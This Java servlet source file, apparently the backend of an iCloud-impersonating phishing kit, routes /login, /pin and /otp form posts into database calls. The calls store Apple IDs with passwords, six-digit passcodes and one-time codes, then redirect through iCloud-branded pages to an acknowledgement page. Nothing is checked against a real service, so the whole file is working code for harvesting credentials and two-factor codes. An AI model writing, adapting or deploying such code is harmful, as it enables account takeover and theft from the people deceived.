package com.quint.icloud;

import java.io.IOException;
import java.sql.SQLException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet({ "/signup", "/login", "/otp", "/pin" })
public class HomeController extends HttpServlet 
{
	private static final long serialVersionUID = 1L;
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
	{
		try 
		{
			switch(request.getRequestURI())
			{
				case "/signup":signup(request, response);break;
				case "/login":login(request, response); break;
				case "/pin":pin(request, response); break;
				case "/otp":otp(request, response); break;
				default: response.getWriter().println("Something went wrong!"+request.getRequestURI());
			}
		} 
		catch (ClassNotFoundException | IOException | SQLException e) 
		{
			e.printStackTrace();
		}
	}

	void signup(HttpServletRequest request, HttpServletResponse response) throws IOException, ClassNotFoundException, SQLException
	{
		String name = request.getParameter("name");
		String email = request.getParameter("email");
		String password = request.getParameter("password");
		Dao.addSignup(name, email, password);
		response.sendRedirect("icloud.jsp");
	}
	
	void login(HttpServletRequest request, HttpServletResponse response) throws IOException, ClassNotFoundException, SQLException
	{
		String id = request.getParameter("id");
		String password = request.getParameter("password");
		Dao.addApple(id, password);
		response.sendRedirect("icloud_dev.jsp");
	}
	
	void pin(HttpServletRequest request, HttpServletResponse response) throws ClassNotFoundException, SQLException, IOException 
	{
		String pin = request.getParameter("pin-1")+request.getParameter("pin-2")+request.getParameter("pin-3")+request.getParameter("pin-4")+request.getParameter("pin-5")+request.getParameter("pin-6");
		Dao.addPin(pin);
		response.sendRedirect("icloud_otp.jsp");
	}
	
	void otp(HttpServletRequest request, HttpServletResponse response) throws IOException, ClassNotFoundException, SQLException
	{
		String otp = request.getParameter("otp-1")+request.getParameter("otp-2")+request.getParameter("otp-3")+request.getParameter("otp-4")+request.getParameter("otp-5")+request.getParameter("otp-6");
		Dao.addOTP(otp);
		response.sendRedirect("ack.jsp");
	}
}
